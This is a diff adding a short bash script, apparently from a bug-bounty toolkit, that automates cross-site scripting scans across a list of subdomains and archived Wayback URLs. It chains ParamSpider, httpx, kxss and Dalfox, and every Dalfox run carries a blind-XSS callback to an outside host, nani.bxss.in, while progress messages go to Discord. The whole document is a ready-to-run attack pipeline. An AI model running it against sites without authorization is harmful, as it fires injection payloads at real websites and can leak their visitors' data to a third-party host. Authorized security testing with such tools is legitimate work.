@@ -1,0 +1,26 @@
+#!/bin/bash
+
+printf "\nXSS Hunter started" | notify --silent -p discord -id "crawl2"
+
+mkdir xss && cd xss
+mkdir paramspider
+mkdir dalfox
+
+printf "Running Paramspider => kxss ==> Dalfox for xss"
+
+# Assuming 'actual_Subdomains.txt' contains one domain per line
+while read -r DOMAIN
+do
+    printf "Scanning domain: $DOMAIN" | notify --silent -p discord -id "crawl2"
+    
+    python3 $HOME/tools/ParamSpider/paramspider.py --domain $DOMAIN -o paramspider/my_params_$DOMAIN.txt | sort -u | httpx -status-code -silent | grep -v "404" | cut -d " " -f 1 | kxss | cut -d " " -f 9 | sort -u | sed 's/=.*/=/' | dalfox pipe -S -b https://nani.bxss.in -o dalfox/xss-dalfox_$DOMAIN.txt
+
+    printf "Scan is completed by kxss and Dalfox for domain: $DOMAIN" | notify --silent -p discord -id "crawl2"
+
+done < ../subdomains/actual_Subdomains.txt
+
+printf "\nXSS Hunter work Finished" | notify --silent -p discord -id "crawl2"
+
+mkdir wayback_xss
+cat ../wayback/urls.txt | grep "=" | egrep -iv ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt|js)" | httpx -status-code -silent | grep -v "404" | cut -d " " -f 1 | kxss | cut -d " " -f 9 | sed 's/=.*/=/' | dalfox pipe -S -b https://nani.bxss.in -o wayback_xss/xss-dalfox.txt
+printf "\nXSS Hunter work Finished" | notify --silent -p discord -id "crawl2"
